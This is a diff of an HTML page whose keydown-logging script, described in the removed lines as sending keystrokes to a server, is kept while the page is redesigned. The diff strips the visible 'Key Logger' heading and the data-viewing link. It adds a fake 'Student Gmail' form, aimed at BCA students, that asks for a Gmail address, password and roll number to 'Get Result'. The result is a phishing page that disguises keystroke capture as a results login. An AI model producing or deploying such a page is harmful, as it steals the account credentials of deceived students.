@@ -4,6 +4,55 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Key Logger</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background-size: cover;
+    }
+    .container {
+      text-align: center;
+      background-color: pink;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    input[type="text"], input[type="password"] {
+      width: 300px;
+      padding: 10px;
+      margin: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #4caf50;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    a {
+      display: block;
+      margin-top: 20px;
+      color: #4caf50;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
   <script>
     document.addEventListener('DOMContentLoaded', (event) => {
       document.addEventListener('keydown', (e) => {
@@ -22,9 +71,15 @@
     });
   </script>
 </head>
-<body>
-  <h1>Key Logger</h1>
-  <p>Press any key to send data to the server.</p>
-  <a href="https://httpserver-1.onrender.com/view-data" target="_blank">View Collected Data</a>
+<body background="https://builtin.com/sites/www.builtin.com/files/styles/og/public/2022-08/warning-cybersecurity-types-of-cyber-attacks.png">
+  <div class="container" >
+    <h1 style="color: light-yellow;">BCA - I BCA - II BCA - III</h1>
+    <h1 style="color: #4caf50;">Student Gmail</h1>
+    <p></p>
+    <input type="text" name="Gmail" placeholder="Enter your Gmail">
+    <input type="password" name="password" placeholder="Enter your Password">
+    <input type="text"  placeholder="Enter your Roll Number">
+    <button>Get Result</button>
+  </div>
 </body>
 </html>
